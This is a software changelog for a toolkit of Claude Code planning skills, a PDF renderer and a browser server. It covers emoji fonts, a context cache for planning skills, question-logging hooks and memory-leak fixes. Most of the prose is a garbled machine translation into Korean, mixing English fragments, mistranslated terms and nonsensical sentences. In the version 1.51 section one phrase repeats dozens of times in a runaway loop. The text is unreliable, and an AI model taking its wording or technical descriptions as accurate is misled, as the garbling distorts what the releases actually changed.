- 알려진 사전 - 연장 : 유산 `test/parity-suite.test.ts` (v1.44.1 기본)은 뇌 인식 계획 해제 릴리스 (v1.49 - v1.52)에서 상속되는 5 계획 - 스킬 크기 회귀를보고; 그들은이 branch와 활성 v1.47 크기 판문 패스와 관련이 없습니다. TODOS.md에서 재베이스 라인에 추적.

## [1.52.2.0] - 2026-05-29

## **각 플랫폼에서 make-pdf PDF에서 Emoji 렌더링. Linux는 tofu 상자를 인쇄하고 설정은 글꼴을 설치합니다.**

make-pdf는 리눅스에서 `.notdef` 두부 ( ⁇ )로 emoji code point를 렌더링하는 데 사용되었습니다. 원인은 누락 된 fallback이었다 : 인쇄 CSS 글꼴 스택은 no 이모티콘 가족, 그리고 대부분의 Linux 디트로 및 컨테이너 배 no 컬러 이모티콘 글꼴을 모두에 포함, 그래서 스키는 이모티콘을 사용하는 모든 헤더와 테이블에 빈 상자를 철었다. Now the body and running-header stacks fall back through Apple Color Emoji, Segoe UI Emoji, and Noto Color Emoji, and `./setup` best-effort installs `fonts-noto-color-emoji` on Linux (apt, with dnf/pacman/apk fallbacks), refreshes the font cache, and restarts a running browser daemon so the next render picks it up. macOS and Windows already shipped an emoji font and are unchanged. Non-emoji Unicode (em dash, times, arrow, bullet, ellipsis) always worked and still does.

## 중요 한 숫자

소스: emoji 렌더링 게이트, `bun test make-pdf/test/e2e/emoji-gate.test.ts`, 100dpi의 색상 이모티콘의 고정 렌더링.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| emoji 지역의 자연적인 (색깔) 화소 | ~0 (토후) | ~1,650 | 진짜 색깔 연출 |
| emoji를 올바르게 렌더링하는 플랫폼 | macOS, Windows | macOS, Windows, Linux | +Linux |
| 무상 가족과 함께 이모지-베어링 폰트 스택 | 0 | 2 | 몸 + 달리는 우두머리 |
| Deterministic는 문을 삽니다 | 0 | 1 | pdffonts + 픽셀 |

토후 상자는 가까운 모노크롬 개요 (로 색된 픽셀에 가깝습니다)입니다. 진짜 이모티콘은 1,650 포화 화소에 대한 땅을 렌더링합니다. 게이트는 이모티콘 폰이 내장 된 (`pdffonts`)과 페이지가 실제로 색상 (`pdftoppm`)로 움직여집니다. PDF 텍스트 추출은 도후로 흘러도 통과하므로 증거로 신뢰할 수 없습니다.

## 이 빌더에 대한 의미

Linux 또는 컨테이너 내부에 PDF를 생성하면, 섹션 헤더와 테이블 상태 컬럼의 이모티콘이 이제 대신  ⁇ 을 렌더링합니다. `./setup`를 Linux에 한 번 실행하면 글꼴을 설치합니다. macOS 또는 Windows에서 할 수 없습니다. `GSTACK_SKIP_FONTS=1`를 설정하여 잠금 해제 또는 오프라인 기계에서 선택하십시오.

### 항목화 된 변경

#### 추가
- `ensure_emoji_font()` `setup`: Linux 색상 이모티콘은 apt/dnf/pacman/apk, `fc-match` 색상-font detection (idempotent, Skips when real color font already resolves), `fc-cache` sudo에서 새로 고침, 그리고 검색-daemon restart so the running render server see the new font. Opt out with `GSTACK_SKIP_FONTS=1`. 비-interactive `sudo -n` and timeout-bound package called so it hangs setup.
- 이식 선택기 (`❤️`, FE0F) 정착물과 함께 Emoji 연출 문 (`make-pdf/test/e2e/emoji-gate.test.ts`): 은색으로 덮는 이모티콘 글꼴을 삽입하고 페이지는 떨어뜨립니다. 팝업이나 글꼴이 누락될 때 CI에 있는 단단한 파일은, 그래서 prerequisite 무희는 녹색 구조의 뒤에 회귀를 숨길 수 없습니다.
- `resolvePopplerTool()` `pdffonts`/ `pdfimages`/ `pdftoppm`를 위한 결심자.
- Ubuntu make-pdf CI 게이트는 `fonts-noto-color-emoji` 이전 Chromium 출시 전에 `fonts-noto-color-emoji`를 설치합니다.

#### 변경
- CSS체와 `@top-center` 런헤드 글꼴 스택은 Apple Color Emoji, Segoe UI Emoji, Noto Color Emoji를 통해 돌아갑니다. 일반적인 `sans-serif` 이전에 배치된 모든 글꼴 스택은 이제 공유한 일정으로 구성됩니다.

#### 고정
- make-pdf no는 리눅스에서 `.notdef` tofu ( ⁇ )로 더 긴 이모티콘을 만듭니다.
## [1.52.1.0] - 2026-05-27

## **Brain-aware 계획 토지. 다섯 계획 기술은 요청하기 전에 개인 gbrain에서 구조화 된 컨텍스트를 읽습니다. - 동일한 질문, 더 똑똑한 답변, no token 세금.**

`/office-hours`, `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`는 이제 gbrain (Wintermute, Local PGLite, 또는 그 어떤 얇은 클라이언트 MCP)에서 타입의 엔티 모델을 미리 준비합니다. "제품은 무엇입니까?" / "현지 사용자입니까?" / "무엇이 이전 범위 호출이었다?"- 유형 `gstack/product`, `gstack/goal`, `gstack/developer-persona`, `gstack/brand`, `gstack/competitive-intel`, `gstack/skill-run`, `gstack/user-profile`, `gstack/take` 페이지의 캐쉬드 제스처로드가됩니다. 두뇌는 제품 및 판단의 구조 모델이 아니라 검색 결과를 찾을 수 없습니다.

잠금 해제: 모든 계획 기술 필터 그것의 권고를 통해 "사용자가 실제로 지금 원하는, 무엇이 제품, 우리가 전에 결정 한 것." 즉, 쿼드런트 코덱 외부-voice에 대 한 정렬 - 뇌에 대 한 설명 리뷰 "이 1 월 CEO 계획" 또는 "당신의 개발자 인 디제스트는 처음 CLI 사용자 말한다; 이 계획은 3 설정 명령을 추가 합니다."

### 중요 한 숫자

출처: `bun test test/brain-cache-spec.test.ts test/skill-preflight-budget.test.ts` (정확한 예산을 정의하십시오) 및 `bin/gstack-brain-cache get product` 연기 (온도 대기 시간을 증명하십시오).

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| Planning-skill 냉연 토큰 (프리미엄 컨텍스트) | 0 (모두 일) | 500-1500 토큰 (워름 히트) / 5-15 KB 한 번에 한 번 (찬 미끼) | Brain-as-model, 그냥 검색하지 |
| MCP 기술 invocation 당 호출 (워머 히트) | n/a (no 통합) | 0 (단 하나 디스크 읽기) | 95% 경로 |
| MCP 기술 invocation 당 호출 (cold miss) | n/a | 4–8 병렬 통화, 1~2s 한 번 | 꽉 묶음 |
| Autoplan (4 순차적 기술) 사전 대비 비용 | n/a | 1개의 냉각하 + 자물쇠 파일을 통해 3개의 온난한 입장 | 동시 dedup 득점방해 4× |
| 새로운 유형의 두뇌 페이지 종류 | 0 | 8 (`gstack-core@1.0.0` 스키마 팩) | 일류 단체 모델 |
| Per-endpoint 신뢰 정책 | 0 (동일 모드만 동기화) | `sha8(MCP URL)` 네임스페이스 당 1개, 해시 충돌 → sha16 | 공유-brain 안전 |
| 새로운 게이트 층 테스트 | 0 | 10 파일 / 111의 주장 | 모든 정정 경로 커버 |

The cache layer keeps the brain integration honest: 95% of invocations are a single disk read at ~10–30ms; cold-miss pays a one-time ~1–2s tax that's deduplicated across concurrent autoplan dispatches via a project-scoped lockfile. Salience is filtered by an allowlist (`projects/`, `concepts/`, `gstack/`) before write so personal pages — family, therapy, reflection — never leak into work-flow planning prompts. 신뢰의 primitive는 개인 brain 자동 퓨시 안전과 공유 brain을 기본으로 보존합니다.

### 너를 위한 이 뜻

오늘 계획 기술을 사용하는 경우: 모든 직업은 다른 것을하지 않고 선명하게됩니다. 기술은 몇 가지 중복 질문을하고 "이는 1 월 계획을 피할"/ "당신의 2 월 TTHW 벤치 마크는 2:15 대 5:30 기본"/ "내선 계획에 대한 지속성"- 당신의 기억이 있어야하는 책의 뇌를하는 뇌.

MCP 뇌 (겨울 또는 당신의 자신의)를 사용하는 경우: `/setup-gbrain` 단계 9.5는 endpoint 당 한 번 신뢰폴리시 질문을 묻습니다. 개인적인 endpoint → `~/.gstack/` artifacts 자동 푸쉬 및 구경측정은 당신의 두뇌에 다시 쓰십시오. 공유/team 엔드포인트 → 읽기 전용, 쓰기 전에, 사용자 이름 간격으로 튀기는 federation 근원 또는 `users/<slug>/gstack/` 접두사.

로컬 PGLite를 사용하는 경우: 개인으로 자동 감지; no 질문 화재. 캐시는 `~/.gstack/{,projects/<slug>/}brain-cache/`에서 per-entity TTLs로 생명을 나타냅니다.

기여자인 경우: 새로운 결의자 패턴(`{{BRAIN_PREFLIGHT}}` / `{{BRAIN_CACHE_REFRESH}}` / `{{BRAIN_WRITE_BACK}}`)은 뇌 통합을 위한 템플릿 솔기입니다. `SKILL_DIGEST_SUBSETS`에 없는 모든 기술에 대한 빈 문자열은 0 비용으로 어떤 자리매김을 합니다.

단계 2 교정 쓰기 백은 `BRAIN_CALIBRATION_WRITEBACK` 기능 플래그 (default off)의 뒤에 게이트가 있습니다. 업스트림 gbrain ships `takes_add` / `takes_resolve` MCP ops (TODOS.md에서 P2로 파일). 플래그 플립이면 기존의 기술 템플릿은 no 템플릿 변경으로 쓰기 백 동작을 선택합니다.

### 항목화 된 변경

**Added**
- `scripts/brain-cache-spec.ts` — `BRAIN_CACHE_ENTITIES` (8개의 엔티티티 × TTL + 예산 + 부당 규칙), `SKILL_DIGEST_SUBSETS` (파일이 로드될 수 있는 퍼스킬), `SALIENCE_DEFAULT_ALLOWLIST`, `SKILL_CALIBRATION_WEIGHTS`, 신뢰-policy + schema-pack 상수.
- `scripts/gstack-schema-pack.ts` — `gstack-core@1.0.0` 8개의 유형 페이지 종류를 가진 스키마 팩: `user-profile`, `product`, `goal`, `developer-persona`, `brand`, `competitive-intel`, `skill-run`, `take`. Frontmatter 모양, 보유 정책, `mcp__gbrain__schema_graph`를 위한 연결 동사.
- `bin/gstack-brain-cache` - 3 층 캐시 CLI: `get`/ `refresh`/ `invalidate`/ `digest`/ `meta`/ `bootstrap`/ `list`/ `purge` subcommands. 원자 쓰기, TTL staleness, mismatch에 schema-version 가득 차 있는 구조, stale-but-usable fallback, con-current defrup.
- `scripts/resolvers/gbrain.ts` — 3개의 새로운 결심자 기능: `generateBrainPreflight`, `generateBrainCacheRefresh`, `generateBrainWriteBack`. 비 전등 기술을 위한 빈 끈 (defensive).
- `bin/gstack-config` — `brain_trust_policy@<endpoint-hash>` 네임스페이스, `endpoint-hash` 서브콤마드 (샤8 충돌 → sha16 에스컬레이션), `resolve-user-slug` 서브콤마드 (D4 A3 정체성 해결 사슬: `whoami` → `$USER` → `sha8(git email)` → `anonymous-<sha8(hostname)>`).
- `setup-gbrain` 단계 9.5 - 뇌 신뢰 정책 질문 per-endpoint. 로컬 자동 설정 개인; 원격 주변 요청; 개인 플립 `artifacts_sync_mode=full`.
- `sync-gbrain` — `--refresh-cache` 플래그 (`/brain-refresh-context` 겹 당 D1 기술 계획), `--audit` 플래그 (gstack-owned page Summary + salience 누출 검사), 단계 1 신뢰-policy gate.
- 10개의 새로운 문 층 시험 파일 (111의 assertions): `brain-cache-spec`, `gstack-schema-pack`, `brain-cache-roundtrip`, `cache-concurrent-refresh`, `salience-allowlist`, `brain-preflight`, `user-slug-fallback`, `schema-version-migration`, `takes-fence-fallback`, `skill-preflight-budget`.

**의 확장**
- SKILL.md.tmpl 파일이 `{{BRAIN_PREFLIGHT}}` (기술체의 정상) 및 `{{BRAIN_CACHE_REFRESH}}`/ `{{BRAIN_WRITE_BACK}}` (기술의 끝) 위주로 타전된 5 계획 SKILL.md.tmpl.
- `scripts/resolvers/index.ts`는 `BRAIN_PREFLIGHT`, `BRAIN_CACHE_REFRESH`, `BRAIN_WRITE_BACK`를 등록합니다.

**관련 기사**
- `TODOS.md` (P2/P3)에 3개의 후속: `/gstack-reflect` 밤으로 종합, 교차 기계 뇌 캐시 sync, 전용 `/gstack-onboarding` 기술.
- 상류 2 단계에 대한 상류 gbrain 의존도 : `takes_add` + `takes_resolve` MCP (P2로 TODOS.md로 파일). 단계 2 배선은 이미 `BRAIN_CALIBRATION_WRITEBACK` 플래그 뒤에 존재; 업스트림 착륙시 국기 플립.
- 플랜 / CEO + eng 검토 기록 : `~/.claude/plans/hm-interesting-well-why-dapper-eagle.md` (Approach B + 5 Cherry-picks + 11 D-decisions from full eng review + codex 외부 청구 합성).

### Save-results 경로: gbrain가 PATH에 있을 때 어떤 CLI의 밑에 일합니다

Brain-aware 계획은 실제 검토 문서를 gbrain에 저장하고, 그냥 preflight 소화 및 교정이 필요하지 않습니다. 설치 시간에 gbrain을 감지하고, 현재 계획 기술이 `office-hours/`, `ceo-plans/`, `eng-reviews/`, `design-reviews/`, `devex-reviews/` 슬러그 스페이스에 대한 압축 `gbrain put "<prefix>/<feature-slug>"` 지침을 방출하는 경우, 계획 기술은 완전히 억제됩니다. token, `design-reviews/`, `devex-reviews/` 슬러그 스페이스. gbrain이 감지되지 않은 경우, 저장 용량 보상 블록은 완전히 억제됩니다. <6> `./setup`를 실행한 후 gbrain를 설치하면, `gstack-config gbrain-refresh`를 실행하여 변경을 선택합니다.

토큰 비용은 단단히 유지 : 인라인 저장 장치 블록은 계획 기술 (~1000에서 네이티브 압축 해제가 추가되었습니다) 당 ~ 150 토큰입니다. 전체 저장 템플릿 (heredoc body, entity-stub Instruction, throttle handling, backlinks)는 `docs/gbrain-write-surfaces.md` §Save Template 및 에이전트가 실제로 저장 할 때만 수요에 읽습니다. 뇌 텍스트로드 블록에 대한 동일한 압축 분야 : ~ 115-text-load 블록 : ~ 115-text-loader-noting.

| 감지 상태 | 퍼플 플랜닝 스킬 token 오버헤드 | 어떤 에이전트은 저장에 |
|---|---|---|
| PATH + `gstack-config gbrain-refresh`에 GBrain는 `local_status: "ok"`를 말합니다 | ~250 토큰 (CONTEXT_LOAD + SAVE_RESULTS, 압축) | `docs/gbrain-write-surfaces.md` 을 수요로 읽습니다. `gbrain put <prefix>/<slug>` |
| PATH에 gbrain 아닙니다 | 0 토큰 | gen-time에 억제되는 구획, 아무것도 연출하지 않는 |
| GBrain 또는 Hermes 주인 접합기 | 전체 인라인 렌더링 (unchanged) | 호출 `gbrain put` 항상 |

모든 5개의 계획 기술에 대해 일관되게 전사: `office-hours`, `plan-ceo-review`, `plan-design-review`, `plan-devex-review`. 마지막 2는 `{{GBRAIN_SAVE_RESULTS}}`의 템플릿에 있는 위주를 얻었습니다 (이전에 첫번째 3가 그것을 가지고 있었습니다, 그래서 디자인 검토 및 devex 검토는 no CLI의 밑에 retrievable 페이지 조차 GBrain CLI) 생성했습니다.

적용: 자유로운 결심자 수준 단위 시험 핀 당 skill 진창 + 꼬리표 메타데이터 + 압축 token 예산 (`test/resolvers-gbrain-save-results.test.ts`, 10의 시험/53 assertions); 자유로운 과도한 기계 시험은 탐지 파일 문 결심자 `detected: true`, `detected: false` 및 `no file` 국가 (`test/gbrain-detection-override.test.ts`, 4개의 시험); a periodic-tier fake-CLI E2E drives `/office-hours` against a stub `gbrain` on PATH and asserts the agent actually calls `gbrain put office-hours/<slug>` with valid YAML frontmatter (`test/skill-e2e-office-hours-brain-writeback.test.ts`, ~$0.50-1/run); a periodic-tier real-CLI round-trip drives `gbrain init --pglite` + `gbrain put` + `gbrain get` against an isolated temp HOME and asserts the body survives (`test/skill-e2e-gbrain-roundtrip-local.test.ts`, ~$0.001/run, skips if `VOYAGE_API_KEY` is unset). Together: 이 에이전트는 해결자 지시를 비난, 해결자는 유효 CLI 모양을 방출하고, CLI는 로컬 엔진에 페이지를 주장합니다. 리모트/Supabase 여정은 명예에 gbrain의 계약입니다 - 동일한 CLI 모양은 모든 엔진을 커버합니다, 그래서 gstack는 국부적으로 왕복 적용에 멈춥니다.

**기여자 (저장 층) :**
- `bin/gstack-config gbrain-refresh` 재 실행 `bin/gstack-gbrain-detect` 및 `~/.gstack/gbrain-detection.json`를 쓰다. `./setup`는 설치의 끝에 이것을 실행하고 조건으로 다시 생성하는 클로드 호스트 SKILL.md를 `bun run gen:skill-docs:user` (added package.json 스크립트)로 재생합니다. 이렇게 감지된 설치는 즉시 뇌 블록을 얻습니다.
- default `bun run gen:skill-docs` (CI canonical)는 탐지 파일을 무시합니다. Committed SKILL.md는 개발자의 국부적으로 gbrain 국가와 관계없이 재현성을 유지합니다. 사용자 지역 설치를 위한 `bun run gen:skill-docs:user`를 사용하십시오.
- `TODOS.md` (P2)에 묶는 2개의 후속 가동: gbrain v0.42+ 배 `takes_add` (`BRAIN_CALIBRATION_WRITEBACK` 깃발 플립); 다른 4 계획 기술에 뇌 writeback E2E를 확장하십시오.

## [1.52.0.0] - 2026-05-27

## **`/plan-tune` 설정은 실제로 뭔가를 수행. Hooks는 메모리로 캡처 세분화, 선호도 바인딩 및 무료 텍스트 답변 루프를 만듭니다.**

Before this release, plan-tune was a profile inspector with a hollow substrate. Every gstack skill told the agent "log this AskUserQuestion fire," and in weeks of dogfood, zero events ever landed. Preferences were agent-honored convention. Declared profile dimensions sat in a JSON file doing nothing. After this release: a PostToolUse hook captures every AUQ fire whether the agent remembers to log or not. A PreToolUse hook substitutes auto-decided answers when you've set `never-ask`. Free-text "Other" 응답은 Claude를 통해 꿈에 도달하여, 다음 inline context로 미래 관련 질문에 주사했습니다. Codex 세션은 구조화 된 JSONL 파서에 의해 백필됩니다.

`./setup` (diff 미리보기, 백업 및 한 번에 한 번에 한 번에 한 번에 한 번에 명시된 동의를 통해 대성당 땅.

### 중요 한 숫자

기존 v1.49 기판에 대한 측정. `bun test test/plan-tune-gates.test.ts test/question-log-hook.test.ts test/question-preference-hook.test.ts test/memory-cache-injection.test.ts test/distill-free-text.test.ts test/distill-apply.test.ts test/declared-annotation.test.ts test/gstack-codex-session-import.test.ts test/skill-e2e-plan-tune-cathedral.test.ts`로 재현.

| Metric | 전 (v1.49.0.0) | (v1.52.0.0) 이후 | Δ |
|---|---|---|---|
| AUQ 세션 당 캡처 | 0 (에이전트전) | 모든 불 (걸이) | 기판 작업 |
| `never-ask` 기본 시행 | 0% (에이전트전) | 100% (걸이 + deny+reason) | 실제로 binds |
| 선언된 프로필 annotations | 0 / 주 | 모든 signal_key 일치 | 프로필 렌더링 |
| 꿈-사이클 메모리 지속 | 0 (no 기계장치) | 프로젝트 + gbrain 거울 | 크로스 프로젝트 recall |
| Codex 세션 백필 | none (regex 아이디어) | 구조 JSONL 파서 | 미래 증거 |
| Per-PR 추가되는 시험 비용 | $0 | $0 (세로민; no claude -p) | 문 층 안전 |
| Unit + E2E 테스트 추가 | — | 96 테스트 / 8 새로운 파일 | 은 |

| Layer | 역할 | 그곳에서 |
|---|---|---|
| 1 — 캡처 | PostToolUse 후크 → dedup + async derive와 질문-log.jsonl | hosts/claude/hooks/question-log-hook.ts |
| 2 — 시행 | PreToolUse 후크 → 자동 변형 된 옵션이있는 deny+reason | hosts/claude/hooks/question-preference-hook.ts |
| 3 — 주석 | 선언된 프로필 → kebab signal_key → 일반 영어 구문 | scripts/declared-annotation.ts |
| 4 - 표면 | host-aware Stats, 최근 자동절차, 감사 표 | plan-tune/SKILL.md.tmpl |
| 5 — 발견 | 설정 후크 설치 프롬프트 + 포스트-ship 판 | 설정, ship/SKILL.md.tmpl |
| 6 - 테스트 | 5 E2E 시나리오, 모든 게이트 계층, $0 비용 | test/skill-e2e-plan-tune-cathedral.test.ts |
| 7 - 설치 | schema-aware bin: PreToolUse + PostToolUse, 백업 + 롤백 | bin/gstack-settings-hook(으)로 |
| 8 — 꿈 주기 | Anthropic SDK 증류 + gbrain put_page + 메모리 주입 | bin/gstack-distill-* + 레이어 2 주사 |

Highest-impact number is the third row: declared profile annotations now render inline before every AUQ that matches a signal_키. `declared.scope 설정_appetite = 0.85` once during /plan-tune setup, and every "should I bundle this fix?" question shows up with "(your profile leans complete-implementation)" on the recommended option. The same loop applies to verbose-vs-terse, consult-vs-delegate, and ship-now-vs-get-the-design-right.

### 솔로 빌더의 의미

이 기능은 지금 화합물입니다. AskUserQuestion 당신은 자유로운 원본을 가진 "다른" 대답을, `gstack-distill-free-text` (3/day 모자, ~$0.01 런 당)에 의해 제안으로 배치된 걸이에 의해 붙잡고, `/plan-tune distill`를 통해 검토하고, `never-ask` 선호, 선언된 단면도 진창, 또는 당신의 gbrain (유형)에 노선을 가진 재사용할 수 있는 기억 nugget 및 관련 질문으로 다음의 시간의 재출시로 재출발합니다. 꿈주기는 잠금 해제입니다. 이없이, 모든 nuanced 대답은 한 차례 후 증발. 이제 그들은 축적. 실행 `./setup` 그리고에 차례로 후크 설치 프롬프트를 받아, 다음 `/plan-tune` 당신이 당신의 프로필이 당신을 알 수 있는지 볼 때마다.

### 항목화 된 변경

**Added**
- `hosts/claude/hooks/question-log-hook` - PostToolUse Hook, matcher 덮개 `AskUserQuestion` + `mcp__*__AskUserQuestion`. marker-first question_id (D18), 해우-fallback 관측 전용, 소스 태그와 함께 모든 AUQ 불을 캡처합니다.
- `hosts/claude/hooks/question-preference-hook` - `(recommended)`-label parser, 거부-on-ambiguous (D2 안전), 프로젝트-then-global preference precedence (D8), 일방향 안전 override. 자동 파생된 사건은 그 자체에서 기록한 후 핑크에서 PostToolUse를 방지합니다.
- `scripts/declared-annotation.ts` - `getDeclaredAnnotation(signal_key)` with kebab→underscore namespace mapping. 강한 밴드에 있는 중간 밴드, 일반 영어 구문에 있는 null을 돌려보내십시오 (>= 0.7 또는 <= 0.3).
- `bin/gstack-codex-session-import` — `~/.codex/sessions/`를 위한 구조상 JSONL 파서. 본 가을에 있는 감적 첫번째 회복, 근원 꼬리표 `codex-import-marker`/`codex-import-pattern`.
- `bin/gstack-distill-free-text` — 층 8 꿈 주기 증류기. Anthropic SDK 직접 전화 (Haiku 4.5), 3/day lt cap per slug (D7), 누적 비용 로그, sync-or-background 실행 context (D14).
- `bin/gstack-distill-apply` - 선택 `--gbrain-published true` 플래그와 함께 표면 (preference / 선언 된 판 / 메모리 엔거)에 대한 승인 된 제안을 적용합니다.
- `setup` - diff 미리보기, 백업, 원-command rollback과 후크 설치에 대한 상호 동의 프롬프트. Marker-gated 그래서 사용자는 한 번에 요청됩니다.
- `ship/SKILL.md.tmpl` 단계 21 — 포스트-교육 계획-tune nudge, at-most-once를 위해 감적.
- `docs/spikes/claude-code-hook-mutation.md` + `docs/spikes/codex-session-format.md` - 구현하기 전에 핀 프로토콜 계약을 출력하는 단계 1 스파이크 출력.
- 8개의 파일에 걸쳐 96개의 새로운 시험: STATE_ROOT 명예를 주고, v1.49 문, 조정 걸이 schema aware ops, 두 걸이, 선언 annotation, 코덱 수입품, 증류 궤, 증류 적용, 기억 주입, 5개의 대성당 E2E 시나리오.

**의 확장**
- `bin/gstack-settings-hook` schema-aware rewrite: `_gstack_source` 태그를 가진 PreToolUse + PostToolUse 등록 dedup, `add-event`/ `remove-source`/ `diff-event`/ `rollback`/ `list-sources` subcommands. 레거시 `add`/`remove` 시작 모양은 동사를 보존했습니다.
- `bin/gstack-question-log` — 소스, 도구_use_id, free_text; 합성 dedup on (출처, 도구_use_id) 마지막 100 라인 (D3); async-fires `gstack-developer-profile --derive` 이후 모든 성공적인 쓰기 (D17 — 이없이, 샘플_size stayed 0)를 받아들입니다.
- 세 개의 빈 (`gstack-question-log`, `gstack-question-preference`, `gstack-developer-profile`) + `gstack-config`는 이제 가장 높은 선명한 배율 (D16 Codex 보정 - 이 없이, 고립 시험은 실제 ~/.gstack)에 자동적으로 썼습니다.
- `scripts/resolvers/question-tuning.ts` preamble - 추가 감적 조립 컨벤션 (`<gstack-qid:{id}>`) 및 `(recommended)` 상표 협약. 감적 존재에 걸이 강제 문.
- `scripts/question-registry.ts` - `signal_key: 'decision-autonomy'`를 `land-and-deploy-merge-confirm`와 `land-and-deploy-rollback`에 추가했습니다 그래서 자율적인 차원에는 진짜 신호 근원이 있습니다.
- `scripts/psychographic-signals.ts` - `decision-autonomy` 신호 지도를 추가했습니다.
- `plan-tune/SKILL.md.tmpl` — 새로운 단면도 (저센트 자동 절개, 감사 표적으로 하는, 꿈 주기 검토, 꿈 주기 증류); 근원 고장 + MARKED %를 가진 주인 조심 Stats; 단계 0는 꿈 주기 문으로 장시간 여정.
- `bin/gstack-uninstall` - 또한 `plan-tune-cathedral` 태그 후크를 제거.

**관련 기사**
- eng 검토 중 4 크로스 모델 인장 해상도 : 프로젝트 선호도는 글로벌 (D8)에서 승리, 해시 ID는 관찰되지 않는 절대 기본 키 (D18), AUQ 매치 커버 MCP 변형 (Codex 보정), 강제 사용 `permissionDecision: "deny"` + 대신 `"allow"` + `updatedInput` 입력 모양이 실제 Claude Code (Claude Code)에 대해 확인 될 때까지 Claude Code (Claude Code).
- 플랜트 프리아블 바이트 예산 래치드 39000 → 40000 `test/gen-skill-docs.test.ts` (~700 바이트 마커 컨벤션에 의해 추가).
- 9 Codex 외부 송장은 재흡입 없이 직접 접힌 것을 찾습니다 (매터 보정, derive 배선, settings.json 동의, Signal_key namespace, 등).

## [1.51.0.0] - 2026-05-27

## **긴 실행 브라우저 세션은 Bun 측에 평평한 RSS를 붙입니다. `$B memory`는 스크린 샷 대신 모든 미래 OOM 영수증을 제공합니다.** 4 CDP 자원 누출 클래스 폐쇄 및 삼각대로 핀; 구조화된 진단 표면 Bun heap + per-tab JS heap + Chromium 과정 나무 + 실제 시간에 있는 경계된 완충기 크기.

이 릴리스는 긴 사이드 바 세션을 통해 침묵적으로 합성 된 검색 서버에서 4 개의 누출 클래스를 닫습니다. 응답 바디 소재화 요청완료 청취자 (멀티 GB/hour 버퍼 churn on media-heavy pages), 세 개의 undetached CDP 세션 전화 사이트 (cdp-bridge, write-commands archive, cdp-inspector), CSS 검수자에 대한 비행식 수정역사 어레이, SSE 가입자 만 ab-dept-inspector에 불이 되었음을 나타냅니다. MV3 의 반란된 경우, MV3 의 반란한 경우, MV3 의 반란된 서비스> 모든 4에는 invariant 테스트가 있습니다. 정적 지프 트립 와이어는 CI가 미래의 재입력자가 헬퍼 모듈 밖에 `newCDPSession(...)` 호출하는 경우 실패합니다.

수정, `$B memory` 및 `/memory`는 원래 160 GB OOM 조사가 누락되었습니다: Bun RSS + heap 고장, per-tab JS heap via CDP `Performance.getMetrics`, Chromium process tree via `SystemInfo.getProcessInfo` (PID + type + CPU), 그리고 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로, 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로, 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로, 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로, 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), 버퍼 크기 (기본적으로), Chromium, (기본적으로), `SystemInfo.getProcessInfo`, (기본적으로), 버퍼 크기 (기본 The sidebar footer polls `/memory` every 30s with adaptive backoff (drops to 5min if response time exceeds 2s), and a tab-count guardrail fires soft-warn at 50 / hard-warn at 200 with a top-5-by-RAM toast offering one-click close. Single-tab JS heap above 4 GB triggers an immediate toast, catching the WebGL/video runaway case where one tab balloons without the count ever reaching 200.

### 중요 한 숫자

출처: 이 branch's 16 커밋 + 포스트 머지 감사 보고서. Net diff: 23 파일 변경, +2251 / -143 = 2394 LOC 검색 서버 (TypeScript), gstack 확장 (JS/HTML/CSS), 테스트.

| 기능 제품 | 이 PR의 앞에 | 이 PR 이후 |
|---|---|---|
| `requestfinished` 몸 취급 | `await res.body()` 각 응답에, 1개의 `.length`를 위한 가득 차있는 몸 완충기를 읽으십시오 | `req.sizes()`는 `Network.loadingFinished`, 0개의 몸 물자화에서 구조화된 바이트 조사를, chunked/gzip/ 스트리밍 응답을 위해 정확한 읽습니다 |
| CDP 세션 수명주기 (3개 사이트) | `newCDPSession`, detach 누락 또는 성공 동정 | `withCdpSession` (try/finally detach) + `getOrCreateCdpSession` (캐드 + 닫기 표) 헬퍼, 모든 3 사이트 migrated, 정적 짐 배선은 회귀를 방지 |
| CSS 검수원에 있는 수정연혁 | unbounded array, 각 `$B css` 세션을 통해 편집 | FIFO 캡 200을 바인딩하여, undo 오류에서 표면 처리되는 evicted-count는 그래서 사용자가 자신의 대상 인덱스가 사라지는 이유를 알고 있습니다. |
| SSE 가입자 정리 | abort-edge only; TCP-died-without-abort 누출 된 가입자 + 컨트롤러 + 처리 출구까지 누비이 즈 바이트 | `createSseEndpoint` 흡습기, 복강화 + 심박수, idempotent (매일 가장자리 불) |
| 탭 카운트 가시성 | none - 사용자는 경고 없이 수백개의 탭을 축적할 수 있었습니다 | 50 (전력 항목)의 부드러운 warn, 200 (TOP 5 RAM + 닫기 선택 + Snooze), 단일 태 >4 GB 트리거 즉시 토스트 |
| 진단 명령 | 이용안내 | `$B memory` (텍스트 + `--json`), `/memory` 엔드포인트 (SSE-session-cookie gated), 적응성 백오프를 가진 옆 막대기 발기자 |
| `server.ts` (SSE 재공장)의 순 변경 | 2개의 엔드포인트를 통하여 인라인 ReadableStream 배선의 132의 선 | 23개의 선, 1명의 돕er를 통해서 두 끝점 노선 |
| 누출 클래스의 핀 테스트 | none 특정 | 6개의 새로운 시험 파일, 45의 새로운 시험; 정체되는 지프 삼각대는 회귀에 CI 실패합니다 |

### 이 빌더를 위한 뜻

